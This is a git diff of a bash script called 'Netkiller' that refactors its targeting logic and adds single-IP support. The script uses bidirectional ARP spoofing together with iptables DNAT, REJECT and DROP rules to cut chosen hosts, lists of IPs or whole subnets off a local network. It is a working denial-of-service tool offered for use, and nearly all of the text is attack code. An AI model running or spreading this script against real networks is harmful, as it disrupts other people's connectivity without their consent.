@@ -11,7 +11,7 @@ GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
 CIDR=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
 IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
 
-echo "Current Network Configuration"
+echo "Current Network Information"
 echo "INTERFACE: | $WLAN"
 echo "GATEWAY:   | $GW"
 echo "Device IP: | $IP"
@@ -29,7 +29,7 @@ read -p "> $GW " INET
 GATEWAY="${INET:-$GW}"
 
 # Detect Target IPs or CIDR
-echo "Enter Multiple Target IP (e.g 10.0.0.123,10.0.0.124) or CIDR (e.g., 192.168.1.0/24)"
+echo "Enter Single Target IP, Multiple Target IPs (e.g 10.0.0.123,10.0.0.124) or CIDR (e.g., 192.168.1.0/24)"
 read -p "> " SUB
 NETWORK_CIDR="${SUB:-$CIDR}"
 
@@ -38,11 +38,11 @@ MYIP="$IP"
 
 echo ""
 # Prompt configuration
-echo "Target Network Configurations..."
+echo "Target Network Configurations"
 echo "Target Interface: | $INTERFACE"
 echo "Target Gateway:   | $GATEWAY"
 echo "Target Subnet:    | $NETWORK_CIDR"
-echo "This Device IP:   | $MYIP"
+echo "This Device IP:   | $MYIP (exempted)"
 echo ""
 
 # Enable IP forwarding
@@ -68,6 +68,28 @@ is_valid_ip() {
     fi
 }
 
+# Function to process a single target IP
+process_target_ip() {
+    local TARGET_IP=$1
+    if [ "$TARGET_IP" != "$MYIP" ] && [ "$TARGET_IP" != "$GATEWAY" ]; then
+        # Drop all packets except your IP source and destination (bidirectional)
+        iptables -t nat -I PREROUTING -s "$TARGET_IP" -j DNAT --to-destination "$GATEWAY"
+        iptables -I FORWARD -s "$TARGET_IP" -p tcp -j REJECT --reject-with tcp-reset
+        iptables -I FORWARD -s "$TARGET_IP" -p udp -j REJECT --reject-with icmp-port-unreachable
+        iptables -I FORWARD -s "$TARGET_IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
+        iptables -I FORWARD -s "$TARGET_IP" -j DROP
+
+        # Bidirectional ARP spoofing
+        (
+            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
+            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
+        ) &    
+        echo "Netkiller targeting IP: $TARGET_IP"
+    else
+        echo "Skipping our own IP or gateway: $TARGET_IP"
+    fi
+}
+
 # Check if input is a list of IPs or a CIDR
 if [[ $NETWORK_CIDR =~ "," ]]; then
     # Handle multiple IPs
@@ -75,28 +97,12 @@ if [[ $NETWORK_CIDR =~ "," ]]; then
     for TARGET_IP in "${TARGET_IPS[@]}"; do
         TARGET_IP=$(echo "$TARGET_IP" | tr -d '[:space:]') # Trim whitespace
         if is_valid_ip "$TARGET_IP"; then
-            if [ "$TARGET_IP" != "$MYIP" ]; then
-                # Drop all packets except your IP source and destination (bidirectional)
-                iptables -t nat -I PREROUTING -s "$TARGET_IP" -j DNAT --to-destination "$GATEWAY"
-                iptables -I FORWARD -s "$TARGET_IP" -p tcp -j REJECT --reject-with tcp-reset
-                iptables -I FORWARD -s "$TARGET_IP" -p udp -j REJECT --reject-with icmp-port-unreachable
-                iptables -I FORWARD -s "$TARGET_IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
-                iptables -I FORWARD -s "$TARGET_IP" -j DROP
-
-                # Bidirectional ARP spoofing
-                (
-                    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-                    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
-                ) &    
-                echo "Netkiller targeting IP: $TARGET_IP"
-            else
-                echo "Skipping our own IP: $TARGET_IP"
-            fi
+            process_target_ip "$TARGET_IP"
         else
             echo "Invalid IP address: $TARGET_IP. Skipping..."
         fi
     done
-else
+elif [[ $NETWORK_CIDR =~ "/" ]]; then
     # Handle CIDR range
     if ! command -v ipcalc &> /dev/null; then
         echo "Error: ipcalc is required but not installed. Please install it (apt install ipcalc or yum install ipcalc)"
@@ -123,22 +129,16 @@ else
 
     for (( i = MIN; i <= MAX; i++ )); do
         TARGET_IP=$(dec2ip "$i")
-
-        if [ "$TARGET_IP" != "$MYIP" ]; then
-            # Drop all packets except your IP source and destination (bidirectional)
-            iptables -t nat -I PREROUTING -s "$TARGET_IP" -j DNAT --to-destination "$GATEWAY"
-            iptables -I FORWARD -s "$TARGET_IP" -p tcp -j REJECT --reject-with tcp-reset
-            iptables -I FORWARD -s "$TARGET_IP" -p udp -j REJECT --reject-with icmp-port-unreachable
-            iptables -I FORWARD -s "$TARGET_IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
-            iptables -I FORWARD -s "$TARGET_IP" -j DROP
-            
-            # Bidirectional ARP spoofing
-            (
-                arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-                arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
-            ) &
-        fi
+        process_target_ip "$TARGET_IP"
     done
+else
+    # Handle single IP
+    if is_valid_ip "$NETWORK_CIDR"; then
+        process_target_ip "$NETWORK_CIDR"
+    else
+        echo "Invalid IP address format: $NETWORK_CIDR"
+        exit 1
+    fi
 fi
 
 echo "Netkiller targeting network: $NETWORK_CIDR"
